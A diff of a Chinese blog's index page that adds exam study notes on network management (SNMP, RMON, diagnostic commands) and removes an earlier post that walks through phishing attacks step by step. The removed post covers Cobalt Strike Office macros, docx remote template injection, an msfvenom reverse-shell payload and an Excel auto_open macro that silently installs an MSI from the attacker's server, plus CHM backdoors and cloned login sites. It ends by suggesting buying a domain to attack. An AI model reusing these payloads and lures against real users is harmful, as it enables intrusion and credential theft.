@@ -158,6 +158,122 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-网工第十一章" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/14/%E7%BD%91%E5%B7%A5%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0/">网工第十一章</a>
+    </h1>
+  
+
+        
+        <a href="/2023/05/14/%E7%BD%91%E5%B7%A5%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0/" class="archive-article-date">
+  	<time datetime="2023-05-13T16:53:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="第十一章-网络管理"><a href="#第十一章-网络管理" class="headerlink" title="第十一章 网络管理"></a>第十一章 网络管理</h1><h2 id="考点分析"><a href="#考点分析" class="headerlink" title="考点分析"></a>考点分析</h2><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305132207811.png" alt="image-20230513220701499"></p>
+<h2 id="11-1-网络管理基础"><a href="#11-1-网络管理基础" class="headerlink" title="11-1 网络管理基础"></a>11-1 网络管理基础</h2><h3 id="11-1-1-网络管理体系结构"><a href="#11-1-1-网络管理体系结构" class="headerlink" title="11-1.1 网络管理体系结构"></a>11-1.1 网络管理体系结构</h3><p>五大功能域。</p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305132208232.png" alt="image-20230513220816020"></p>
+<h3 id="11-1-2-网络监控体系结构"><a href="#11-1-2-网络监控体系结构" class="headerlink" title="11-1.2 网络监控体系结构"></a>11-1.2 网络监控体系结构</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305132209768.png" alt="image-20230513220911589"></p>
+<p>两种通信方式：轮询和事件报告</p>
+<h4 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h4><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305132211057.png" alt="image-20230513221151850"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305132212345.png" alt="image-20230513221223178"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305132213334.png" alt="image-20230513221348174"></p>
+<h2 id="11-2-SNMP"><a href="#11-2-SNMP" class="headerlink" title="11-2 SNMP"></a>11-2 SNMP</h2><h3 id="11-2-1-网络管理协议五大标准"><a href="#11-2-1-网络管理协议五大标准" class="headerlink" title="11-2.1 网络管理协议五大标准"></a>11-2.1 网络管理协议五大标准</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140003548.png" alt="image-20230514000339369"></p>
+<p>ISO由国际标准制定的。</p>
+<h3 id="11-2-2-SNMP核心考点-–2个服务3个端口5个报文"><a href="#11-2-2-SNMP核心考点-–2个服务3个端口5个报文" class="headerlink" title="11-2.2 SNMP核心考点 –2个服务3个端口5个报文"></a>11-2.2 SNMP核心考点 –2个服务3个端口5个报文</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140006198.png" alt="image-20230514000618901"></p>
+<p>trap和SNMPtrap的作用不一样。</p>
+<p>客户机Service，服务端Trap。</p>
+<p>客户机无论无何开放的都是161，服务器运行trap的是162，其他是随机端口。</p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140011227.png" alt="image-20230514001137815"></p>
+<h4 id="练习题-1"><a href="#练习题-1" class="headerlink" title="练习题"></a>练习题</h4><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140013834.png" alt="image-20230514001316657"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140014575.png" alt="image-20230514001454297"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140017917.png" alt="image-20230514001754540"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140019639.png" alt="image-20230514001902204"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140019127.png" alt="image-20230514001931808"></p>
+<h3 id="11-2-3-SNMP机制与问题"><a href="#11-2-3-SNMP机制与问题" class="headerlink" title="11-2.3 SNMP机制与问题"></a>11-2.3 SNMP机制与问题</h3><p><strong>SNMPv1</strong></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140019506.png" alt="image-20230514001954138"></p>
+<p><strong>SNMPv2</strong></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140020329.png" alt="image-20230514002049073"></p>
+<p><strong>SNMPv3</strong></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140021329.png" alt="image-20230514002127989"></p>
+<h4 id="练习题-2"><a href="#练习题-2" class="headerlink" title="练习题"></a>练习题</h4><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140022634.png" alt="image-20230514002233323"></p>
+<p>团体名相当于简单密码。</p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140023433.png" alt="image-20230514002328279"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140023444.png" alt="image-20230514002342222"></p>
+<h3 id="11-2-3-管理数据库-MIB-2"><a href="#11-2-3-管理数据库-MIB-2" class="headerlink" title="11-2.3 管理数据库 MIB-2"></a>11-2.3 管理数据库 MIB-2</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140024092.png" alt="image-20230514002407737"></p>
+<h4 id="练习题-3"><a href="#练习题-3" class="headerlink" title="练习题"></a>练习题</h4><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140026364.png" alt="image-20230514002624178"></p>
+<h2 id="11-3-RMON"><a href="#11-3-RMON" class="headerlink" title="11-3 RMON"></a>11-3 RMON</h2><p>远程网络监控协议：</p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140026923.png" alt="image-20230514002647635"></p>
+<p>用来检测网络当中流量的协议。</p>
+<h4 id="练习题-4"><a href="#练习题-4" class="headerlink" title="练习题"></a>练习题</h4><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140029229.png" alt="image-20230514002910919"></p>
+<h2 id="11-4-网络管理命令"><a href="#11-4-网络管理命令" class="headerlink" title="11-4 网络管理命令"></a>11-4 网络管理命令</h2><h3 id="11-4-1-网络诊断命令-ipconfig"><a href="#11-4-1-网络诊断命令-ipconfig" class="headerlink" title="11-4.1 网络诊断命令 ipconfig"></a>11-4.1 网络诊断命令 ipconfig</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140029772.png" alt="image-20230514002952536"></p>
+<p>ipconfig &#x2F;all的截图</p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140031889.png" alt="image-20230514003105539"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140034360.png" alt="image-20230514003418926"></p>
+<h3 id="11-4-2-故障诊断-ping-traceroute"><a href="#11-4-2-故障诊断-ping-traceroute" class="headerlink" title="11-4.2 故障诊断 ping traceroute"></a>11-4.2 故障诊断 ping traceroute</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140034599.png" alt="image-20230514003458403"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140038500.png" alt="image-20230514003847273"></p>
+<p>*表示有可能超时，或者nat，或者防火墙以及其他设备的过滤。</p>
+<h3 id="11-4-3-ARP命令"><a href="#11-4-3-ARP命令" class="headerlink" title="11-4.3 ARP命令"></a>11-4.3 ARP命令</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140040087.png" alt="image-20230514004037794"></p>
+<p>-a 与 -g 是一样的</p>
+<h3 id="11-5-netstat"><a href="#11-5-netstat" class="headerlink" title="11-5 netstat"></a>11-5 netstat</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140042995.png" alt="image-20230514004217728"></p>
+<h3 id="11-6-route和nslookup"><a href="#11-6-route和nslookup" class="headerlink" title="11-6 route和nslookup"></a>11-6 route和nslookup</h3><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140042036.png" alt="image-20230514004246715"></p>
+<h4 id="练习题-5"><a href="#练习题-5" class="headerlink" title="练习题"></a>练习题</h4><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140044119.png" alt="image-20230514004453750"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140045260.png" alt="image-20230514004507114"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140046249.png" alt="image-20230514004619876"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140050881.png" alt="image-20230514005006420"></p>
+<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140050858.png" alt="image-20230514005017508"></p>
+<p>在windows中会自动生成一条指向自己的主机路由，这就是接口的ip地址。</p>
+<h2 id="章节总结"><a href="#章节总结" class="headerlink" title="章节总结"></a>章节总结</h2><p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202305140050883.png" alt="image-20230514005049565"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/05/14/%E7%BD%91%E5%B7%A5%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-网工第十章" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1666,178 +1782,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2023/04/30/%E7%BD%91%E5%B7%A5%E7%AC%AC%E4%B8%80%E7%AB%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-关于钓鱼" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/11/28/%E5%85%B3%E4%BA%8E%E9%92%93%E9%B1%BC/">关于钓鱼</a>
-    </h1>
-  
-
-        
-        <a href="/2022/11/28/%E5%85%B3%E4%BA%8E%E9%92%93%E9%B1%BC/" class="archive-article-date">
-  	<time datetime="2022-11-28T14:36:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>首先，牢记网络安全，熟读网络安全法。</p>
-<p>网络钓鱼是最常见的社会工程学方式之一。</p>
-<h2 id="office钓鱼攻击"><a href="#office钓鱼攻击" class="headerlink" title="office钓鱼攻击"></a>office钓鱼攻击</h2><p>Office宏，译自英文单词Macro。宏是Office自带的一种高级教本特性，通过VBA代码，可以在Office去完成，某项特定的任务，而不必再重复相同的动作，目的是让用户完成一些任务自动化。宏病毒是寄存在文档或模块中的宏的计算机病毒，一旦打开这样的文件，其中的宏病毒就会执行。</p>
-<p>环境 win10 x64、word、cobalt strike4</p>
-<p><strong>cobalt strike生成宏</strong>	<img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211172137938.png" alt="image-20221117213715746"></p>
-<p>点击生成macros</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211172149339.png" alt="image-20221117214949223"></p>
-<p>word文档里面需要打开开发模式</p>
-<p>打开自定义工作区</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251237256.png" alt="image-20221125123705172"></p>
-<p>开发工具勾上。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251238341.png" alt="image-20221125123800871"></p>
-<p>点击宏</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251239008.png" alt="image-20221125123909678"></p>
-<p>然后点击创建。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251240192.png" alt="image-20221125124049870"></p>
-<p>把刚刚的宏代码复制过来</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251242156.png" alt="image-20221125124239591"></p>
-<p>然后保存</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251245723.png" alt="image-20221125124501150"></p>
-<p>右键运行就能在cs上看见结果。有了权限过来，就可以进行进一步的渗透。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251256487.png" alt="image-20221125125637994"></p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251259318.png" alt="image-20221125125932856"></p>
-<h3 id="docx文档远程模板注入"><a href="#docx文档远程模板注入" class="headerlink" title="docx文档远程模板注入"></a>docx文档远程模板注入</h3><p>与传统的宏启用文档相比，这种攻击的好处是多方面的。在对目标执行网络攻击时，你可以把.docx的文档直接附加在电子邮件中。word远程模板执行宏就是利用word文档加载附加模板时的缺陷所发起的恶意请求而达到攻击目的，所以当目标用户点开攻击者发给他的恶意word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。</p>
-<p>发送的文档本身不带恶意代码的，能过很多静态的检测。</p>
-<p>方法：我们需要创建两个不同的文件。第一个是启用宏的模板，或是.dotm文件，他将包含恶意VBA宏。第二个是看似没有危害的.docx文件，他本身不包含恶意代码，只指向恶意模板文件的目标链接。</p>
-<p>1.创建.dotm文件，跟上面差不多的步骤，新建docx文档，选择Vlsual basis</p>
-<p>2.创建服务器链接放入docx文档里面。</p>
-<p>python2：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -m SimpleHTTPServer 8088</span><br></pre></td></tr></table></figure>
-
-<p>python3:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -m http.server 8088</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251335044.png" alt="image-20221125133501148"></p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251335023.png" alt="image-20221125133515491"></p>
-<p>然后创建一个正常的docx文件，随便加载一个模板。</p>
-<p>把创建的文档改后缀名为zip，然后解压进去找到这个setting.xml.rels文件。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251342707.png" alt="image-20221125134231064"></p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251344908.png" alt="image-20221125134421805"></p>
-<p>把这里面的地址更改为刚刚创建的服务器的地址。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251346292.png" alt="image-20221125134646699"></p>
-<p>复制和替换刚刚的文件。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211251348997.png" alt="image-20221125134817433"></p>
-<p>然后在这里压缩并改后缀名，双击打开就会执行宏代码。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252022900.png" alt="image-20221125202209262"></p>
-<p>一样的可以在cobalt strike上进行操作。</p>
-<h3 id="excel-宏躲杀软检测"><a href="#excel-宏躲杀软检测" class="headerlink" title="excel 宏躲杀软检测"></a>excel 宏躲杀软检测</h3><p>Excel一般指Microsoft office excel，是当下最流行的计算机数据处理软件。它跟office一样都是支持宏，所以一样存在宏病毒。当我们把恶意的宏代码放入excel里面，用户打开excel的宏就会被触发。</p>
-<p>使用metasploit生成一个msi文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.116.129 lport=1234 -f msi -o hack.msi</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252035016.png" alt="image-20221125203520256"></p>
-<p>一样的开启服务器</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252036732.png" alt="image-20221125203630429"></p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252037898.png" alt="image-20221125203712242"></p>
-<p>启动msfconsole</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252042898.png" alt="image-20221125204215075"></p>
-<p>在win10虚拟机上新建excel文件，然后右键插入宏表。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252044054.png" alt="image-20221125204441365"></p>
-<p>然后插入代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=EXEC(&quot;msiexec /q /i http://192.168.116.129:8088/hack.msi&quot;)</span><br><span class="line">=HALT()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252049104.png" alt="image-20221125204922457"></p>
-<p>A1这里设置为auto_open。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252054237.png" alt="image-20221125205439795"></p>
-<p>然后这里就是我们制作好的宏文件</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252055624.png" alt="image-20221125205542121"></p>
-<p>可以看到这里已经在监听了。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211252110985.png" alt="image-20221125211059422"></p>
-<p>记得启用宏。</p>
-<h3 id="CHM电子书钓鱼"><a href="#CHM电子书钓鱼" class="headerlink" title="CHM电子书钓鱼"></a>CHM电子书钓鱼</h3><p>CHM：一编译的帮助文档。是微软新一代的帮助文件格式，利用HTML作为源文,把帮助内容以类似数据库的形式编译储存。</p>
-<p>.Chm文件格式是HTML格式的拓展，他本来是一种用于给软件应用程序做用户手册的特殊文本格式。</p>
-<p>chm的后门文件一般只针对Windows，，Linux不能直接打开chm文件，需要安装第三方软件才能打开chm文件。</p>
-<p>制作chm钓鱼文件</p>
-<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Ridter/MyJSRat%E3%80%82">https://github.com/Ridter/MyJSRat。</a></p>
-<p>下载项目：git clone <a target="_blank" rel="noopener" href="https://github.com/Ridter/MyJSRat%E3%80%82">https://github.com/Ridter/MyJSRat。</a></p>
-<p>kali里面开启一个jsrat服务器</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211261641568.png" alt="image-20221126164142304"></p>
-<p>然后看得到恶意代码所在。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211261642765.png" alt="image-20221126164241656"></p>
-<p>复制payload过去。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211261652495.png" alt="image-20221126165253014"></p>
-<p>注意payload里面第一个空格应该是逗号的，然后另存为ansi编码格式。</p>
-<p>需要下载easychm工具。</p>
-<p>easychm打开文件</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211261710494.png" alt="image-20221126171003083"></p>
-<p>点击编译</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211261710616.png" alt="image-20221126171056252"></p>
-<p>生成chm文件双击打开即可上线。</p>
-<p>也可以使用cobalt strike制作CHM钓鱼。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211261747045.png" alt="image-20221126174715414"></p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211261748821.png" alt="image-20221126174819322"></p>
-<p>然后上线cobalt sttrike</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211261819734.png" alt="image-20221126181954207"></p>
-<h3 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h3><p>克隆网站主要是指模仿相关网页的页面格式，制作页面颜色、标识均与原网站视觉效果相同，且域名差距不大，被用于谋取利益的非法网站。当受害人访问的时候，如果对方没有防御心理，看到类似相同的网站一般情况下都会输入账号和密码，同时也可以诱导受害人下载恶意文件，同时也可以劫持网页记录键盘等操作</p>
-<h4 id="1-利用cobalt-strike克隆网站"><a href="#1-利用cobalt-strike克隆网站" class="headerlink" title="1.利用cobalt strike克隆网站"></a>1.利用cobalt strike克隆网站</h4><p><a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com</a> 克隆百度</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211210124076.png" alt="image-20221121012440012"></p>
-<p>点击生成克隆网址，</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211210120866.png" alt="image-20221121012046760"></p>
-<p>可以看到这个生成的网站是和百度基本上都是一样的。<img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211210125040.png" alt="image-20221121012547969"></p>
-<p>看得到用户的输入记录。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211210126139.png" alt="image-20221121012646075"></p>
-<p>上传一个后门文件</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211210134240.png" alt="image-20221121013405184"></p>
-<p>然后就会提示下载<img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211210135702.png" alt="image-20221121013558640"></p>
-<p>还可以加入一些攻击手段。</p>
-<p><img src="https://sanj-1313479604.cos.ap-nanjing.myqcloud.com/image/202211210138687.png" alt="image-20221121013820636"></p>
-<p>然后网站钓鱼也是差不多的流程，到时候可以自己购买个域名作为钓鱼网站来进行攻击。     </p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/11/28/%E5%85%B3%E4%BA%8E%E9%92%93%E9%B1%BC/">展开全文 >></a>
         </p>
       
 
